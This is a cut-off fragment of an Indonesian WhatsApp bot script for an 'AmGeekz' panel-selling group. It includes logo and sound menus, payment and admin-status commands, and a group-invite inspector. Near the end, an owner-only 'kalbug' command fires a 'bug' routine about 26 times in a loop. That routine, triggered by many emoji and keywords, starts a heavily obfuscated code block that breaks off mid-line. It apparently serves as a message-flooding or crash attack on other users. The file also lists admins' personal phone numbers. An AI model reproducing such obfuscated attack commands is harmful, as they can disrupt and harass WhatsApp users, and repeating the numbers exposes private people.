haikal.sendMessage(from, { image: hw18,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw19': {
haikal.sendMessage(from, { image: hw19,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw20': {
haikal.sendMessage(from, { image: hw20,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw21': {
haikal.sendMessage(from, { image: hw21,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw22': {
haikal.sendMessage(from, { image: hw22,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw23': {
haikal.sendMessage(from, { image: hw23,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw24': {
haikal.sendMessage(from, { image: hw24,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw25': {
haikal.sendMessage(from, { image: hw25,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw26': {
haikal.sendMessage(from, { image: hw26,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw27': {
haikal.sendMessage(from, { image: hw27,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw28': {
haikal.sendMessage(from, { image: hw28,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw29': {
haikal.sendMessage(from, { image: hw29,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw30': {
haikal.sendMessage(from, { image: hw30,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw31': {
haikal.sendMessage(from, { image: hw31,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw32': {
haikal.sendMessage(from, { image: hw32,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw33': {
haikal.sendMessage(from, { image: hw33,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw34': {
haikal.sendMessage(from, { image: hw34,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw35': {
haikal.sendMessage(from, { image: hw35,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw36': {
haikal.sendMessage(from, { image: hw36,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw37': {
haikal.sendMessage(from, { image: hw37,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw38': {
haikal.sendMessage(from, { image: hw38,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw39': {
haikal.sendMessage(from, { image: hw39,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw40': {
haikal.sendMessage(from, { image: hw40,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw41': {
haikal.sendMessage(from, { image: hw41,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw42': {
haikal.sendMessage(from, { image: hw42,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw43': {
haikal.sendMessage(from, { image: hw43,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw44': {
haikal.sendMessage(from, { image: hw44,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw45': {
haikal.sendMessage(from, { image: hw45,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw46': {
haikal.sendMessage(from, { image: hw46,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw47': {
haikal.sendMessage(from, { image: hw47,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw48': {
haikal.sendMessage(from, { image: hw48,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw49': {
haikal.sendMessage(from, { image: hw49,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw50': {
haikal.sendMessage(from, { image: hw50,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw51': {
haikal.sendMessage(from, { image: hw51,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw52': {
haikal.sendMessage(from, { image: hw52,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw53': {
haikal.sendMessage(from, { image: hw53,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw54': {
haikal.sendMessage(from, { image: hw54,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw55': {
haikal.sendMessage(from, { image: hw55,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw56': {
haikal.sendMessage(from, { image: hw56,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw57': {
haikal.sendMessage(from, { image: hw57,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw58': {
haikal.sendMessage(from, { image: hw58,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw59': {
haikal.sendMessage(from, { image: hw59,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw60': {
haikal.sendMessage(from, { image: hw60,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw61': {
haikal.sendMessage(from, { image: hw61,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw62': {
haikal.sendMessage(from, { image: hw62,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw63': {
haikal.sendMessage(from, { image: hw63,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw64': {
haikal.sendMessage(from, { image: hw64,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw65': {
haikal.sendMessage(from, { image: hw65,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw66': {
haikal.sendMessage(from, { image: hw66,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw67': {
haikal.sendMessage(from, { image: hw67,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw68': {
haikal.sendMessage(from, { image: hw68,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw69': {
haikal.sendMessage(from, { image: hw69,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw70': {
haikal.sendMessage(from, { image: hw70,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw71': {
haikal.sendMessage(from, { image: hw71,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw72': {
haikal.sendMessage(from, { image: hw72,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw73': {
haikal.sendMessage(from, { image: hw73,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw74': {
haikal.sendMessage(from, { image: hw74,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw75': {
haikal.sendMessage(from, { image: hw75,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw76': {
haikal.sendMessage(from, { image: hw76,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw77': {
haikal.sendMessage(from, { image: hw77,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw78': {
haikal.sendMessage(from, { image: hw78,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw79': {
haikal.sendMessage(from, { image: hw79,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
//=================================================//
case 'listsound':{
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

sound1
sound2
sound3
sound4
sound5
sound6
sound7
sound8
sound9
sound10
sound11
sound12
sound13
sound14
sound15
sound16
sound17
sound18
sound19
sound20
sound21
sound22
sound23
sound24
sound25
sound26
sound27
sound28
sound29
sound30
sound31
sound32
sound33
sound34
sound35
sound36
sound37
sound38
sound39
sound40
sound41
sound42
sound43
sound44
sound45
sound46
sound47
sound48
sound49
sound50
sound51
sound52
sound53
sound54
sound55
sound56
sound57
sound58
sound59
sound60
sound61
sound62
sound63
sound64
sound65
sound66
sound67
sound68
sound69
sound70
sound71
sound72
sound73
sound74
sound75
sound76
sound77
sound78
sound79
sound80
sound81
sound82
sound83
sound84
sound85
sound86
sound87
sound88
sound89
sound90
sound91
sound92
sound93
sound94
sound95
sound96
sound97
sound98
sound99
sound100
sound101
sound102
sound103
sound104
sound105
sound106
sound107
sound108
sound109
sound110
sound111
sound112
sound113
sound114
sound115
sound116
sound117
sound118
sound119
sound120
sound121
sound122
sound123
sound124
sound125
sound126
sound127
sound128
sound129
sound130
sound131
sound132
sound133
sound134
sound135
sound136
sound137
sound138
sound139
sound140
sound141
sound142
sound143
sound144
sound145
sound146
sound147
sound148
sound149
sound150
sound151
sound152
sound153
sound154
sound155
sound156
sound157
sound158
sound159
sound160
sound161`}, { quoted: m })
}
break
case 'listlogo':
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

hw1
hw2
hw3
hw4
hw5
hw6
hw7
hw8
hw9
hw10
hw11
hw12
hw13
hw14
hw15
hw16
hw17
hw18
hw19
hw20
hw21
hw22
hw23
hw24
hw25
hw26
hw27
hw28
hw29
hw30
hw31
hw32
hw33
hw34
hw35
hw36
hw37
hw38
hw39
hw40
hw41
hw42
hw43
hw44
hw45
hw46
hw47
hw48
hw49
hw50
hw51
hw52
hw53
hw54
hw55
hw56
hw57
hw58
hw59
hw60
hw61
hw62
hw63
hw64
hw65
hw66
hw67
hw68
hw69
hw70
hw71
hw72
hw73
hw74
hw75
hw76
hw77
hw78
hw79

🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
break

case 'listjualan': case 'jualan': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

LIST JUALAN AMGEEKZ :
panel
hwcap
skrop
🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
}
break
case 'apkamgeekz':{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

APLIKASI AMGEEKZ :
amgeekzcoy

🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
}
break
case 'layanan': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

SYARAT KETENTUAN LAYANAN AMGEEKZ YANG BERLAKU :
larangan
warning
infoamgeekz
tutorial
redemcode
🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
}
break
case 'payment': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

PAYMENT AMGEEKZ :
pdana
pgopay
prekening

*Pembayaran*

A/N
Deni Saputra

Semoga Kalian Suka 🥳
🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
}
break
case 'listwibu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

LIST WIBU AMGEEKZ :
awoo
yeet
bite
lick
pat
kill
nom
poke
wink
bonk
glomp
smug
blush
wave
smile
highfive
cringe
dance
happy
handhold 

🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
}
break
//=================================================//
      case 'setadmin': {
      if (!isCreator) return m.reply(mess.owner)
        let setbot = global.db.data.settings[botNumber]
       if (args[0] === 'inod'){
setbot.inod = true
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'sura'){
setbot.inod = false
setbot.sura = true
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'hwmods'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = true
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'onkabeh'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = true
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'offkabeh'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = true
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'inod1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = true
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'sura1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = true
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'hwmods1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = true
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'onkabeh1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = true
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'offkabeh1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = true
m.reply('Success Coy')
} else {
let amukan = `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}
setadmin inod = INOD ONLINE ✅
setadmin sura = SURA ONLINE ✅
setadmin hwmods = ʜᴡ ᴍᴏᴅꜱ ᴡᴀ ONLINE ✅
setadmin inod1 = SURA x HW ONLINE ✅
setadmin hwmods1 = INOD x HW ONLINE ✅
setadmin sura1 = INOD x SURA ONLINE ✅
setadmin onkabeh = SEMUA ONLINE ✅
setadmin offkabeh = SEMUA OFFLINE 🚫
setadmin onkabeh1 = SERVER PENUH 🔏
setadmin offkabeh1 = MAINTENANCE 🤧`
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: amukan}, { quoted: m })
}
    }
    break
    
    case 'listadmin': {
 let setbot = global.db.data.settings[botNumber]
if (setbot.inod) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Offline🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.sura) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Online✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Offline🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.hwmods) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.onkabeh) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Online✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.offkabeh) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Offline🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.inod1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Online✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.hwmods1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.sura1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.onkabeh1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*SERVER PENUH*` }, { quoted:m })
} else if (setbot.offkabeh1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*MAINTENANCE*` }, { quoted:m })
} 
     }
    break
case 'inspect': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
haikal.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
try {
pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
haikal.sendFile(from, pp, "", m, { caption: tekse, mentions: await haikal.parseMention(tekse) })
sticSukses(from)
})
}
break
case 'kalbug': {
if (!isCreator) return
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
reploy(`Waalaikumsalam`)
deploy('kal')
await sleep(1500)
}
break
case 'kal': case 'bug': case 'apa': case 'kenapa': case 'oke': case 'bug': case 'apa': case 'kenapa': case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': case '🦖': case '🦕': case '👿': case '⚔️': case '⚡': case '💥': case '🌪️': case '🍂': case '🐕': case '🗿': case '😱': case '😎': case '🥵': case '🥶': case '😂': case '😭': case '🤣': case '😈':{
 (function(_0x4142ec,_0x308a40){function _0x27bfc7(_0x3d2924,_0x2c63ca,_0x3ab17a,_0x510618,_0xae6aa4){return _0x3618(_0x510618- -0x1d6,_0x3d2924);}function _0x14f9d9(_0x200565,_0x2dabf8,_0x207827,_0x6ed9c5,_0x433acf){return _0x3618(_0x6ed9c5-0x29b,_0x200565);}function _0xd31749(_0x4d239,_0x3d3a63,_0x3c89c3,_0x5b60d1,_0x5b23ee){return _0x3618(_0x3d3a63-0x399,_0x4d239);}function _0x6df500(_0x13493b,_0x3f16a6,_0x2ddda2,_0x4fa554,_0x253502){return _0x3618(_0x4fa554-0x138,_0x2ddda2);}var _0x23fdf5=_0x4142ec();function _0x474748(_0x3c6177,_0x339f52,_0x4ef5ac,_0x56f608,_0x12ab50){return _0x3618(_0x3c6177-0x17c,_0x12ab50);}while(!![]){try{var _0x2971c9=parseInt(_0x27bfc7(0x190,0x15b,0x194,0xe2,0x93))/(0x7*-0x326+-0xa2*-0x1c+-0x29*-0x1b)+parseInt(_0x474748(0x459,0x3ce,0x458,0x3cf,0x50a))/(0x1*0x12fd+-0x2f*-0xc3+0x36c8*-0x1)*(-parseInt(_0xd31749(0x606,0x680,0x6df,0x6e9,0x612))/(-0xab*0x12+-0x556+0x115f))+parseInt(_0xd31749(0x55f,0x60c,0x56a,0x616,0x693))/(0x1557*-0x1+-0xa6*0x10+0x1fbb*0x1)+-parseInt(_0x474748(0x3c5,0x371,0x440,0x3dc,0x355))/(-0x260e+-0x1b*-0x36+0x2061)*(-parseInt(_0x6df500(0x504,0x4a3,0x4a3,0x45b,0x3d1))/(0x1*-0x9ef+-0x61d+-0x809*-0x2))+parseInt(_0x27bfc7(0x1a7,0x1db,0x16e,0x12b,0x1bc))/(0x2c5*-0xe+-0x14a6+0x3b73)*(-parseInt(_0x27bfc7(0x89,0x105,0x198,0x102,0x1a3))/(0xcf4+0x2*0xe9b+-0x2a22))+-parseInt(_0x27bfc7(0x18d,0x15c,0x190,0x10b,0x196))/(0x61*-0x53+0x637+0x1945)+parseInt(_0x474748(0x3c1,0x317,0x3f7,0x30f,0x34c))/(0xf*0x71+-0x56*-0x43+-0x1d17)*(parseInt(_0x474748(0x3bf,0x3e3,0x34f,0x3e9,0x3a7))/(-0x105a+-0x118f*0x1+0x21f4));if(_0x2971c9===_0x308a40)break;else _0x23fdf5['push'](_0x23fdf5['shift']());}catch(_0x15863b){_0x23fdf5['push'](_0x23fdf5['shift']());}}}(_0x5d34,-0x65efb+0x84398+0xde2*0x6b));var _0x5e18bc=(function(){function _0x5188c3(_0x48adb8,_0x250903,_0x4cf255,_0x134b58,_0x2f6b09){return _0x3618(_0x134b58- -0x32c,_0x2f6b09);}function _0x380997(_0x5ca689,_0x54f08c,_0x14dc8a,_0x416580,_0x56a3e5){return _0x3618(_0x14dc8a- -0x2ef,_0x416580);}function _0x54e81b(_0x2799c0,_0x1762c5,_0x1a6c80,_0x388df4,_0x3ccd6b){return _0x3618(_0x1a6c80-0x32e,_0x388df4);}function 